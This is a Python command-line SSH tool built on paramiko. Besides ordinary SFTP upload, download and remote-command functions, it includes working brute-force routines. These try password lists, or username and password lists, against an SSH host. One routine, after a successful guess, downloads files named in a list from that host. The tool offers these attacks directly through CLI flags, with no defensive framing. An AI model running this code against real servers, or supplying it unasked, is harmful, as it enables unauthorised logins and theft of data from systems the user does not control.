"""
#TODO import description
"""
import os
import time
import argparse
import paramiko
import paramiko.ssh_exception

def ssh_upload(ip, user, password, local_files, remote_path, all_files=False):
    """   
    Uploads an entire directory or specified file.
    To upload an entire directory set all_files=True and:
        remote_path = "/Path/to/remote/dir
        local_path = "/Path/to/local/dir
    
    To upload a single file (e.g .txt files):
        remote_path = "/Path/to/filename.txt
        local_path = "/Path/to/save/filename.txt
    """
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())#Accepts host key

    def upload_files(local_dir, remote_dir): #To upload an entire folder and subfolders.
        try:
            sftp.mkdir(remote_dir)
        except IOError:#If the folder already exists it wont make a new one.
            pass

        for file in os.listdir(local_dir):
            local_path = os.path.join(local_dir, file)
            remote_path = os.path.join(remote_dir, file).replace("\\", "/")

            if os.path.isdir(local_path): #recursive incase of subfolders.
                upload_files(local_path, remote_path)
            else:
                sftp.put(local_path, remote_path)
                print(f"The file: {local_path} has been uploaded to {remote_path}")

    try:
        ssh.connect(ip, username=user, password=password)
        print(f"Connected to {ip} as {user}")

        sftp = ssh.open_sftp()
        if all_files:#Calls entire_dir and uploads everything in that dir
            upload_files(local_files, remote_path)
        else:
            sftp.put(local_files, remote_path)
            print(f"The file: {local_files} has been uploaded to {remote_path}")

        sftp.close()

    except paramiko.AuthenticationException:
        print("Failed to authenticate")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        ssh.close()

def ssh_download(ip, user, password, local_path, remote_path, all_files=False):
    """
    Downloads an entire directory or specified file.
    To download an entire directory set all_files=True and:
        remote_path = "/Path/to/remote/dir
        local_path = "/Path/to/local/dir
    
    To download a single file (e.g .txt files):
        remote_path = "/Path/to/filename.txt
        local_path = "/Path/to/save/filename.txt
    """
    ssh = paramiko.SSHClient()

    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    def download_files(local_dir, remote_dir): #Downloads everything in remote_path
        try:
            os.mkdir(local_dir)
        except OSError:#If the folder already exists it wont make a new one.
            pass

        for file in sftp.listdir_attr(remote_dir):
            remote_file_path = os.path.join(remote_dir, file.filename).replace("\\", "/")
            local_file_path = os.path.join(local_dir, file.filename)
            try:
                sftp.listdir(remote_file_path)
                download_files(local_file_path, remote_file_path)
            except IOError:
                sftp.get(remote_file_path, local_file_path)
                print(f"The file: {remote_file_path} has been downloaded to {local_file_path}")

    try:
        ssh.connect(ip, username=user, password=password)
        print(f"Connected to {ip} as {user}")

        sftp = ssh.open_sftp()
        if all_files:#Downloads the entire dir if all_files=True
            download_files(local_path, remote_path)
        # elif sftp.listdir(remote_path):
        #     print(f"{remote_path} is a folder!")
        else:
            sftp.get(remote_path, local_path)
            print(f"The file {remote_path} has been downloaded to {local_path}")

        sftp.close()

    except paramiko.AuthenticationException:
        print("Failed to authenticate")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        ssh.close()

def ssh_brute_password(ip, username, password_file):
    """
    Bruteforcing an ssh connection with passwords from a file
    """
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    if os.path.exists(password_file):
        with open(password_file, 'r') as file:
            passwords = file.read().splitlines()
        print(f"Trying to bruteforce password on {ip} as {username}")

        for password in passwords:
            try:
                print(f"Trying {username}-{password}")
                ssh.connect(ip, username=username, password=password)
                print('\n----------------------------')
                print(f"Successful login with {username}-{password}")
                print('----------------------------\n')
                ssh.close()
                break

            except paramiko.AuthenticationException:
                print(f"Failed with {username} - {password}")
                print('----------------------------')

            except Exception as e:
                print(f"Error: {e}")

            finally:
                ssh.close()

            time.sleep(0.5)
    else:
        print(f"File: {password_file} Does not exist")

def ssh_brute_user_password(ip, username_file, password_file):
    """
    Bruteforcing ssh connection with usernames and passwords from files
    """
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        with open(password_file, 'r') as password_file:
            passwords = password_file.read().splitlines()

        with open(username_file, 'r') as user_file:
            users = user_file.read().splitlines()

        print(f"Trying to bruteforce username and password on {ip}")
        for user in users:
            connection = False
            for password in passwords:
                try:
                    print(f"Trying {user}-{password}")
                    ssh.connect(ip, username=user, password=password)
                    print('\n----------------------------')
                    print(f"Successful login with {user}-{password}")
                    print('----------------------------\n')
                    ssh.close()
                    connection = True
                    break

                except paramiko.AuthenticationException:
                    print(f"Failed with {user} - {password}")
                    print('----------------------------')

                except Exception as e:
                    print(f"Error: {e}")

                finally:
                    ssh.close()

                time.sleep(0.5)
            if connection:
                break

    except FileNotFoundError as e:
        print(f"Error: {e}")

def ssh_brute_grab(ip, username, password_file, local_path, remote_path):
    """
    Bruteforcing an ssh connection with passwords from a file and downloads
    files from directories provided from a file.
    """
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    def grab(local_path, remote_path):
        if os.path.exists(remote_path):
            with open(remote_path, 'r') as path_file:
                remote_path = path_file.read().splitlines()

                for path in remote_path:
                    path = path.strip()
                    if not path:
                        continue
                    try:
                        sftp.stat(path) # Raises IOError if the file does not exist
                        path_file = path.split('/')[-1]
                        local_file = os.path.join(local_path, path_file)
                        sftp.get(path, local_file)
                        print(f'Downloaded {path} to {local_file}')

                    except IOError as e:
                        print(f"Error: Could not download {path}. Reason: {e}")
        else:
            print(f"Cannot find {remote_path}")

    if os.path.exists(password_file):
        with open(password_file, 'r') as file:
            passwords = file.read().splitlines()
        print(f"Trying to bruteforce password on {ip} as {username}")

        for password in passwords:
            try:
                print(f"Trying {username}-{password}")
                ssh.connect(ip, username=username, password=password)
                print('\n----------------------------')
                print(f"Successful login with {username}-{password}")
                print('----------------------------\n')

                sftp = ssh.open_sftp()
                grab(local_path, remote_path)
                sftp.close()
                ssh.close()
                break

            except paramiko.AuthenticationException:
                print(f"Failed with {username} - {password}")
                print('----------------------------')

            except Exception as e:
                print(f"Error: {e}")
                break
            finally:
                ssh.close()

            time.sleep(0.5)
    else:
        print(f"File: {password_file} Does not exist")

def ssh_commands(ip, user, password, commands):
    """
    description of func
    """
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    if os.path.exists(commands):
        with open(commands, 'r') as file:
            commands = file.read().splitlines()

            try:
                ssh.connect(ip, username=user, password=password)
                print(f"Connected to {ip} as {user}")

                for command in commands:
                    stdin, stdout, stderr = ssh.exec_command(command)

                    output = stdout.read().decode()
                    error = stderr.read().decode()

                    if output:
                        print(output)
                    if error:
                        print(f"Error: {error}")

            except paramiko.AuthenticationException:
                print("Failed to authenticate")
            except Exception as e:
                print(f"Error: {e}")
            finally:
                ssh.close()
    else:
        print(f"Cannot find file {commands}")

def cli():
    """
    Function to handle all the argparse options and returning args to main
    """
    parser = argparse.ArgumentParser(description="--SSH-Tool--")

    parser.add_argument("ip",help="Enter ip for ssh-connection")
    parser.add_argument("username",
                            nargs='?',
                            help="Enter username for ssh-connection unless -bu is used")

    parser.add_argument("password",
                            nargs='?',
                            help="Enter password for ssh-connection unless -b/-bu is used")

    parser.add_argument("-u",
                            dest="upload",
                            nargs=2,
                            metavar=("l_File", "r_Path"),
                            help="Upload local file/s to remote path")

    parser.add_argument("-a",
                            dest="all",
                            action="store_true",
                            help="If used, targets all files in a dir")

    parser.add_argument("-d",
                            dest="download",
                            nargs=2,
                            metavar=("l_path", "r_path"),
                            help="Download file/s to local path from remote path")


    parser_group = parser.add_mutually_exclusive_group()
    parser_group.add_argument("-b",
                            dest="bf_password",
                            metavar="passwordlist",
                            help="Bruteforce password, submit passwordlist")

    parser_group.add_argument("-bu",
                            dest="bf_user_password",
                            nargs=2,
                            metavar=("users", "passwords"),
                            help="Bruteforce username and password, submit user and passwordlists")

    parser_group.add_argument("-bg",
                            dest="bf_password_grabfiles",
                            nargs=3,
                            metavar=("passwords", "l_path", "r_path"),
                            help="Bruteforce password and download files from a list.txt")

    parser_group.add_argument("-c",
                            dest="command",
                            metavar="df -h",
                            help="To run commands after connection (e.g: 'df -h' whoami)")

    arg = parser.parse_args()
    return arg


if __name__ == "__main__":

    args = cli()
    ip = args.ip
    username = args.username
    pwd = args.password

    if args.download:
        local_path = args.download[0]
        remote_path = args.download[1]
        if args.all:
            ssh_download(ip, username, pwd, local_path, remote_path, True)
        else:
            ssh_download(ip, username, pwd, local_path, remote_path)

    if args.upload:
        local_path = args.upload[0]
        remote_path = args.upload[1]
        if args.all:
            ssh_upload(ip, username, pwd, local_path, remote_path, True)
        else:
            ssh_upload(ip, username, pwd, local_path, remote_path)

    if args.command:
        commands = args.command
        ssh_commands(ip, username, pwd, commands)

    if args.bf_password:
        passwords = args.bf_password
        ssh_brute_password(ip, username, passwords)

    if args.bf_password_grabfiles:
        passwords = args.bf_password_grabfiles[0]
        local_path = args.bf_password_grabfiles[1]
        remote_path = args.bf_password_grabfiles[2]
        ssh_brute_grab(ip, username, passwords, local_path, remote_path)

    if args.bf_user_password:
        usernames = args.bf_user_password[0]
        passwords = args.bf_user_password[1]
        ssh_brute_user_password(ip, usernames, passwords)
